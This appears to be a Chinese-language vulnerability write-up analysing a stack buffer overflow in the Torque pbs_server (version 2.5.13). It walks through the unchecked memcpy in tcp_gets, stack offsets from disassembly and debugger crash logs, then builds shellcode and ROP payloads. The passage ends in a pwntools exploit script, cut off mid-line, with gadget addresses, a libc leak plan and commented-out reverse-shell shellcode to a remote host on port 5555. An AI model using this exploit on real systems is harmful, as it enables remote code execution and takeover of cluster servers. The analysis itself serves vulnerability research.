        <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">){</span>
          <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
        <span class="p">}</span>
        
        <span class="n">cp</span> <span class="o">=</span> <span class="n">scratch</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">dis_umaxd</span><span class="p">){</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">dis_umaxd</span><span class="p">)</span>
            <span class="k">break</span><span class="p">;</span>

          <span class="o">*</span><span class="n">cp</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="n">dis_umax</span><span class="p">,</span> <span class="n">dis_umaxd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">count</span><span class="p">){</span>
          <span class="k">if</span> <span class="p">(((</span><span class="n">c</span> <span class="o">=</span> <span class="o">*++</span><span class="n">cp</span><span class="p">)</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="sc">'9'</span><span class="p">)){</span>
            <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
          <span class="p">}</span>

          <span class="n">ndigs</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">ndigs</span> <span class="o">+</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>    <span class="cm">/* END if (count &gt; 1) */</span>

 <span class="c1">// 递归调用disrsi_</span>
      <span class="k">return</span><span class="p">(</span><span class="n">disrsi_</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">negate</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">ndigs</span><span class="p">));</span>
      <span class="k">break</span><span class="p">;</span>
      
    <span class="k">case</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
      <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="o">-</span><span class="mi">2</span><span class="p">:</span>
      <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOF</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="nl">default:</span>
      <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="o">*</span><span class="n">negate</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>

<span class="nl">overflow:</span>
	  <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">UINT_MAX</span><span class="p">;</span>
	  <span class="k">return</span><span class="p">(</span><span class="n">DIS_OVERFLOW</span><span class="p">);</span>
  <span class="p">}</span>  

</code></pre></div></div>

<p>每一次的递归都会产生一个disrsi_函数栈，其中包含一个新的scratch数组。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">tcp_gets</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">ct</span><span class="p">){</span>
  <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">tcpdisbuf</span> <span class="o">*</span><span class="n">tp</span><span class="p">;</span>
  <span class="n">tp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">tcparray</span><span class="p">[</span><span class="n">fd</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">readbuf</span><span class="p">;</span>

  <span class="k">while</span> <span class="p">(</span><span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_eod</span> <span class="o">-</span> <span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_leadp</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">ct</span><span class="p">){</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">tcp_read</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">){</span>
      <span class="k">return</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>  <span class="cm">/* Error or EOF */</span>
    <span class="p">}</span>
  <span class="p">}</span>

<span class="c1">// 漏洞点，把获取到的tcp数据拷贝到str数组，没有进行长度检查</span>
<span class="c1">// str指向父函数disrsi_中定义的 char  scratch[DIS_BUFSIZ+1]; </span>
<span class="c1">// scratch数组长度为65字节</span>
  <span class="n">memcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">str</span><span class="p">,</span> <span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_leadp</span><span class="p">,</span> <span class="n">ct</span><span class="p">);</span>

  <span class="n">tp</span><span class="o">-&gt;</span><span class="n">tdis_leadp</span> <span class="o">+=</span> <span class="n">ct</span><span class="p">;</span>

  <span class="k">return</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">ct</span><span class="p">);</span>
<span class="p">}</span>  <span class="cm">/* END tcp_gets() */</span>

</code></pre></div></div>

<p>scratch数组到rbp的距离为0x60，到返回地址距离为0x68：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:000000000000E134 <span class="p">;</span> <span class="o">===============</span> S U B R O U T I N E <span class="o">=======================================</span>
.text:000000000000E134
.text:000000000000E134 <span class="p">;</span> Attributes: bp-based frame
.text:000000000000E134
.text:000000000000E134 <span class="p">;</span> int __cdecl disrsi_<span class="o">(</span>int stream, int <span class="k">*</span>negate, unsigned int <span class="k">*</span>value, unsigned int count<span class="o">)</span>
.text:000000000000E134 disrsi_         proc near          <span class="p">;</span> CODE XREF: _disrsi__localalias+4↑j
.text:000000000000E134                                    <span class="p">;</span> disrsi_+3B1↓p
.text:000000000000E134                                    <span class="p">;</span> DATA XREF: ...
.text:000000000000E134
.text:000000000000E134 value           <span class="o">=</span> qword ptr <span class="nt">-78h</span>
.text:000000000000E134 negate          <span class="o">=</span> qword ptr <span class="nt">-70h</span>
.text:000000000000E134 count           <span class="o">=</span> dword ptr <span class="nt">-68h</span>
.text:000000000000E134 stream          <span class="o">=</span> dword ptr <span class="nt">-64h</span>
.text:000000000000E134 scratch         <span class="o">=</span> byte ptr <span class="nt">-60h</span>    <span class="p">;</span>scratch数组距离返回地址0x68字节
.text:000000000000E134 c               <span class="o">=</span> dword ptr <span class="nt">-14h</span>
.text:000000000000E134 <span class="nb">cp</span>              <span class="o">=</span> qword ptr <span class="nt">-10h</span>
.text:000000000000E134 ndigs           <span class="o">=</span> dword ptr <span class="nt">-8</span>
.text:000000000000E134 locval          <span class="o">=</span> dword ptr <span class="nt">-4</span>
.text:000000000000E134
.text:000000000000E134 <span class="p">;</span> __unwind <span class="o">{</span>
.text:000000000000E134                 endbr64
.text:000000000000E138                 push    rbp
.text:000000000000E139                 mov     rbp, rsp
.text:000000000000E13C                 add     rsp, 0FFFFFFFFFFFFFF80h
.text:000000000000E140                 mov     <span class="o">[</span>rbp+stream], edi
.text:000000000000E143                 mov     <span class="o">[</span>rbp+negate], rsi
.text:000000000000E147                 mov     <span class="o">[</span>rbp+value], rdx
.text:000000000000E14B                 mov     <span class="o">[</span>rbp+count], ecx
.text:000000000000E14E                 cmp     <span class="o">[</span>rbp+negate], 0
.text:000000000000E153                 jnz     short loc_E174
.text:000000000000E155                 lea     rcx, __PRETTY_FUNCTION___2322 
.text:000000000000E15C                 mov     edx, 68h
.text:000000000000E161                 lea     rsi, aLibdisDisrsiC
.text:000000000000E168                 lea     rdi, aNegateNull
.text:000000000000E16F                 call    ___assert_fail
.text:000000000000E174 <span class="p">;</span> <span class="nt">---------------------------------------------------------------------------</span>
.text:000000000000E174
.text:000000000000E174 loc_E174:                               <span class="p">;</span> CODE XREF: disrsi_+1F↑j
.text:000000000000E174                 cmp     <span class="o">[</span>rbp+value], 0
.text:000000000000E179                 jnz     short loc_E19A
.text:000000000000E17B                 lea     rcx, __PRETTY_FUNCTION___2322
.text:000000000000E182                 mov     edx, 69h
.text:000000000000E187                 lea     rsi, aLibdisDisrsiC
.text:000000000000E18E                 lea     rdi, aValueNull_1
.text:000000000000E195                 call    ___assert_fail
</code></pre></div></div>

<p>每次都是从scratch + 1的位置开始写入，所以实际的溢出长度为0x67（103）</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">disrsi_</span><span class="p">(</span><span class="kt">int</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">negate</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="kt">unsigned</span>  <span class="n">count</span><span class="p">){</span>
  <span class="kt">int</span>  <span class="n">c</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">locval</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">ndigs</span><span class="p">;</span>
  <span class="kt">char</span>  <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
  <span class="kt">char</span>  <span class="n">scratch</span><span class="p">[</span><span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>     <span class="c1">//被溢出的对象, 长度为65</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">DIS_BUFSIZ</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">dis_umaxd</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">disiui_</span><span class="p">();</span>   <span class="c1">//计算dis_umaxd的值</span>
    
	<span class="c1">// 函数指针调用，实际调用tcp_getc函数, 获取1字节tcp数据</span>
	<span class="c1">// 判断 正负号 以及用户输入是不是一个合法的十进制字符串</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">dis_getc</span><span class="p">)(</span><span class="n">stream</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">case</span> <span class="sc">'-'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'+'</span><span class="p">:</span>
      <span class="o">*</span><span class="n">negate</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'-'</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span><span class="p">){</span> <span class="c1">//</span>
        <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">dis_umaxd</span><span class="p">){</span>    <span class="c1">// 经过调试，dis_umaxd=10</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">dis_umaxd</span><span class="p">)</span>    <span class="c1">// 该变量的意义是unsigned int的最大值为0xffff_ffff</span>
          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>          <span class="c1">// 化为十进制就是4294967295，长度为10个字符</span>
                                  <span class="c1">// 意义就是unsigned int的最大数需要用10个数字来表示十进制值</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">scratch</span><span class="p">,</span> <span class="n">dis_umax</span><span class="p">,</span> <span class="n">dis_umaxd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
          <span class="k">goto</span> <span class="n">overflow</span><span class="p">;</span>
      <span class="p">}</span>                           <span class="c1">// 以上处理用户输入超过unsigned int表示范围的情况</span>
      <span class="n">cp</span> <span class="o">=</span> <span class="n">scratch</span><span class="p">;</span>
      <span class="n">locval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

      <span class="k">do</span>
        <span class="p">{</span>
        <span class="k">if</span> <span class="p">(((</span><span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">cp</span><span class="o">++</span><span class="p">)</span> <span class="o">&lt;</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="sc">'9'</span><span class="p">))</span>
          <span class="p">{</span>
          <span class="k">return</span><span class="p">(</span><span class="n">DIS_NONDIGIT</span><span class="p">);</span>
          <span class="p">}</span>

        <span class="n">locval</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">locval</span> <span class="o">+</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">count</span><span class="p">);</span>
      <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">locval</span><span class="p">;</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_SUCCESS</span><span class="p">);</span>

      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>     <span class="c1">//第一个数字不能是0</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">DIS_LEADZRO</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'8'</span><span class="p">:</span>
    <span class="k">case</span> <span class="sc">'9'</span><span class="p">:</span>
      <span class="n">ndigs</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>    <span class="c1">//计算十进制字符串的长度</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
      <span class="c1">//每次都是从scratch + 1的位置开始写</span>
        <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">dis_gets</span><span class="p">)(</span><span class="n">stream</span><span class="p">,</span> <span class="n">scratch</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">){</span>
          <span class="k">return</span><span class="p">(</span><span class="n">DIS_EOD</span><span class="p">);</span>
        
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="发生栈溢出的现场">发生栈溢出的现场</h2>

<p>发现 disrsi_ 函数返回地址已经被覆盖为0xdeadbeefdeadbeef。</p>

<p>rdi寄存器指向我们输入的字符串“111111111”，因此可以考虑往栈上面写”/bin/sh”，这样后面rop的时候rdi指向的就直接是可执行文件的路径。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; c 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f3e41963525 <span class="k">in </span>disrsi_ <span class="o">()</span> from /usr/local/lib/libtorque.so.2
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
__________________[ REGISTERS / show-flags off / show-compact-regs off <span class="o">]</span>________________
<span class="k">*</span>RAX  1
 RBX  7
<span class="k">*</span>RCX  0x7f3e416a9015 __ 0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>
<span class="k">*</span>RDX  0x6f
<span class="k">*</span>RDI  0x7ffda583cf41 __ 0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>   //注意到rdi指向我们的payload
<span class="k">*</span>RSI  0x7f3e416a9015 __ 0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>
<span class="k">*</span>R8   0x7f3e419734d4 <span class="o">(</span>tcp_gets<span class="o">)</span> __ endbr64 
<span class="k">*</span>R9   0x7f3e41941b80 __ 0
<span class="k">*</span>R10  0x7f3e41959a9d __ <span class="s1">'read_nonblocking_socket'</span>
 R11  0x246
 R12  0x407e20 <span class="o">(</span>_start<span class="o">)</span> __ endbr64 
 R13  0x7ffda583e8a0 __ 1
 R14  0
 R15  0
<span class="k">*</span>RBP  0x3131313131313131 <span class="o">(</span><span class="s1">'11111111'</span><span class="o">)</span>
<span class="k">*</span>RSP  0x7ffda583cfa8 __ 0xdeadbeefdeadbeef
<span class="k">*</span>RIP  0x7f3e41963525 <span class="o">(</span>disrsi_+1009<span class="o">)</span> __ ret 
___________________________[ DISASM / x86-64 / <span class="nb">set </span>emulate on <span class="o">]</span>__________________________
 _ 0x7f3e41963525 &lt;disrsi_+1009&gt;    ret                   &lt;0xdeadbeefdeadbeef&gt;
    _

__________________________________________[ STACK <span class="o">]</span>______________________________________
00:0000_ rsp 0x7ffda583cfa8 __ 0xdeadbeefdeadbeef
01:0008_     0x7ffda583cfb0 __ 0
02:0010_     0x7ffda583cfb8 __ 0x7ffda583d0e4 __ 0xffffffff
03:0018_     0x7ffda583cfc0 __ 0x7ffda583d0e8 __ 0x7f3e00000000
04:0020_     0x7ffda583cfc8 __ 0xa00000000
05:0028_     0x7ffda583cfd0 __ 0x323100
06:0030_     0x7ffda583cfd8 __ 0
07:0038_     0x7ffda583cfe0 __ 0
___________________________________________[ BACKTRACE <span class="o">]</span>_________________________________
 _ 0   0x7f3e41963525 disrsi_+1009
   1 0xdeadbeefdeadbeef None
   2              0x0 None
_________________________________________
</code></pre></div></div>

<h2 id="payload构造和函数栈帧">payload构造和函数栈帧</h2>

<h3 id="shellcode执行版本">shellcode执行版本</h3>

<p>其中payload部分长度为229字节，payload头部必须是非零十进制数；</p>

<p>“A” * 103 从 scratch + 1开始覆盖到返回地址；</p>

<p>返回地址覆盖为 jmp rsp 指令的地址；</p>

<p>shellcode的功能是反弹shell到远程主机的5555端口</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-shellcode_payload.jpg" alt="torque-shellcode payload.jpg" /></p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-shellcode%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7.jpg" alt="torque-shellcode函数栈帧.jpg" /></p>

<h3 id="rop版本">rop版本</h3>

<p>p64(ret)用来把rsp进行16字节对齐</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%B8%80%E8%BD%AE.jpg" alt="torque-rop第一轮.jpg" /></p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%BA%8C%E8%BD%AE.jpg" alt="torque-rop第二轮.jpg" /></p>

<p>第三轮交互到栈溢出的时候rdi寄存器指向scratch+1的位置，我们可以把“/bin/sh\x00”写在此处这样直接就能作为execv的第一个参数使用。</p>

<p><img src="/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%B8%89%E8%BD%AE.jpg" alt="torque-rop第三轮.jpg" /></p>

<h2 id="利用代码">利用代码</h2>

<h3 id="rop版本可绕nx">rop版本（可绕NX）</h3>

<p>rop版本的利用有3个关键点：</p>

<ol>
  <li>需要把socket句柄重定向到stdin和stdout，这样才能在execv(”/bin/sh”)之后可以同pwntools和远程交互；</li>
  <li>需要泄露出libc基地址，由此计算dup2函数地址做输入输出重定向；</li>
  <li>需要在pbs_server的代码段找到一个可重入的地址，每次栈溢出执行rop之后可以返回到该地址，重新接收下一轮数据，进行下一轮栈溢出</li>
</ol>

<p>以上这么设计的原因是需要多轮的栈溢出，需要多次和pbs_server交互而不能把它打崩溃。</p>

<p>经过搜索找到main_loop函数作为可重入地址。</p>

<p>该函数是pbs_server的主要逻辑，并且没有参数作为输入，唯一的要求就是，通过rop进入之前要保证rsp是16字节对齐。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">main</span><span class="p">(){</span>
  <span class="p">......</span>
  <span class="n">add_conn</span><span class="p">(</span><span class="n">rppfd</span><span class="p">,</span> <span class="n">Primary</span><span class="p">,</span> <span class="p">(</span><span class="n">pbs_net_t</span><span class="p">)</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PBS_SOCK_INET</span><span class="p">,</span> <span class="n">rpp_request</span><span class="p">);</span>
  <span class="n">add_conn</span><span class="p">(</span><span class="n">privfd</span><span class="p">,</span> <span class="n">Primary</span><span class="p">,</span> <span class="p">(</span><span class="n">pbs_net_t</span><span class="p">)</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PBS_SOCK_INET</span><span class="p">,</span> <span class="n">rpp_request</span><span class="p">);</span>

  <span class="n">main_loop</span><span class="p">();</span>
  <span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div>

<p>若进入main_loop之前rsp没有16字节对齐，会报段错误，出错的指令在sprintf函数里面：
“movaps xmmword ptr [rsp], xmm0”</p>

<ul>
  <li>这条指令的作用是：将 XMM0 寄存器的 128 位（16字节）数据移动到栈 [rsp] 中；</li>
  <li>对齐要求：
    <ul>
      <li>movaps(<strong>Move Aligned Packed Single-Precision</strong>) 要求目标内存地址 <strong>必须按 16 字节对齐</strong>（即地址是 16 的倍数，如 0x7fffffffe000）</li>
      <li>若未对齐，会触发段错误异常（崩溃）</li>
    </ul>
  </li>
  <li>替代方法：
    <ul>
      <li>确保 rsp 是 16 的倍数</li>
      <li>改用不要求对齐的 movups（但性能略低）</li>
    </ul>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f29deb78dcd <span class="k">in</span> ?? <span class="o">()</span> from /lib/x86_64-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
_____________________[ REGISTERS / show-flags off / show-compact-regs off <span class="o">]</span>_______________________________________________________________
<span class="k">*</span>RAX  0
<span class="k">*</span>RBX  0xffffffffffffffff
<span class="k">*</span>RCX  0
<span class="k">*</span>RDX  0xffffffffffffffff
<span class="k">*</span>RDI  0x7ffcd61949c8 __ 0xfbad8000
<span class="k">*</span>RSI  0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
<span class="k">*</span>R8   0
<span class="k">*</span>R9   0x7f29decd1b80 __ 0
<span class="k">*</span>R10  0x7f29ded15028 __ <span class="s1">'Server Ready, pid = %d, loglevel=%d'</span>
 R11  0x246
<span class="k">*</span>R12  0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
<span class="k">*</span>R13  0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
<span class="k">*</span>R14  0x7ffcd61949c8 __ 0xfbad8000
<span class="k">*</span>R15  0x7f29ded15028 __ <span class="s1">'Server Ready, pid = %d, loglevel=%d'</span>
<span class="k">*</span>RBP  0x7ffcd61949c8 __ 0xfbad8000
<span class="k">*</span>RSP  0x7ffcd6194988 __ 0
<span class="k">*</span>RIP  0x7f29deb78dcd __ movaps xmmword ptr <span class="o">[</span>rsp], xmm0
_____________________[ DISASM / x86-64 / <span class="nb">set </span>emulate on <span class="o">]</span>________________________________________________________________________
 _ 0x7f29deb78dcd    movaps xmmword ptr <span class="o">[</span>rsp], xmm0     &lt;<span class="o">[</span>0x7ffcd6194988] not aligned to 16 bytes&gt;
   0x7f29deb78dd1    call   _IO_setb                    &lt;_IO_setb&gt;
 
   0x7f29deb78dd6    movdqa xmm0, xmmword ptr <span class="o">[</span>rsp]
   0x7f29deb78ddb    mov    qword ptr <span class="o">[</span>rbp + 8], r13
   0x7f29deb78ddf    movups xmmword ptr <span class="o">[</span>rbp + 0x18], xmm0
   0x7f29deb78de3    <span class="nb">test   </span>r12, r12
   0x7f29deb78de6    je     0x7f29deb78e30              &lt;0x7f29deb78e30&gt;
 
   0x7f29deb78de8    movq   xmm0, r12
   0x7f29deb78ded    movq   xmm1, rbx
   0x7f29deb78df2    mov    qword ptr <span class="o">[</span>rbp + 0x10], r12
   0x7f29deb78df6    punpcklqdq xmm0, xmm1
___________________________________[ STACK <span class="o">]</span>_____________________________________________________________________________________
00:0000_ rsp 0x7ffcd6194988 __ 0
01:0008_-038 0x7ffcd6194990 __ 0x7f29deb777bf __ mov dword ptr <span class="o">[</span>rbp + 0xc0], r12d
02:0010_-030 0x7ffcd6194998 __ 0
03:0018_-028 0x7ffcd61949a0 __ 0x7ffcd6194b08 __ 0x3000000010
04:0020_-020 0x7ffcd61949a8 __ 0x538ba0 <span class="o">(</span>log_buffer<span class="o">)</span> __ <span class="s1">'Torque Server Version = 2.5.13, loglevel = 0'</span>
05:0028_-018 0x7ffcd61949b0 __ 0xffffffffffffffff
06:0030_-010 0x7ffcd61949b8 __ 0
07:0038_-008 0x7ffcd61949c0 __ 0x7f29deb6a0e8 __ mov rdx, rbx
__________________________________[ BACKTRACE <span class="o">]</span>___________________________________________________________________________________
 _ 0   0x7f29deb78dcd None
   1   0x7f29deb6a0e8 None
   2   0x7f29deb46ec8 sprintf+168
   3         0x421418 main_loop+81
   4         0x422539 main+2468
_______________________________________________________________________________________________________
</code></pre></div></div>

<p>rop解决方式，可以绕过NX：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="c1">#context.log_level = 'debug'
</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>

<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">172.17.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15001</span><span class="p">)</span>

<span class="n">overflow_distance</span> <span class="o">=</span> <span class="mi">103</span>     <span class="c1"># 实际溢出长度为103
</span><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x41c83d</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x4282b0</span>
<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0x4426c2</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x421A4F</span>
<span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x40900d</span>
<span class="n">execv_plt</span> <span class="o">=</span> <span class="mh">0x407DA0</span>
<span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x407850</span>
<span class="n">got_snprintf</span> <span class="o">=</span> <span class="mh">0x46A4B0</span>
<span class="n">main_loop</span> <span class="o">=</span> <span class="mh">0x422534</span>

<span class="c1"># 反弹shell到远程5555端口
</span><span class="sh">'''</span><span class="s">
shellcode = asm(shellcraft.connect(</span><span class="sh">"</span><span class="s">192.168.141.128</span><span class="sh">"</span><span class="s">, 5555) + shellcraft.dupsh())
payload = b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="s"> + b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="s"> * (overflow_distance - 8) + </span><span class="se">\
</span><span class="s">            p64(jmp_rsp) + shellcode 
</span><span class="sh">'''</span>

<span class="c1"># rop解决方式
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">overflow_distance</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> \
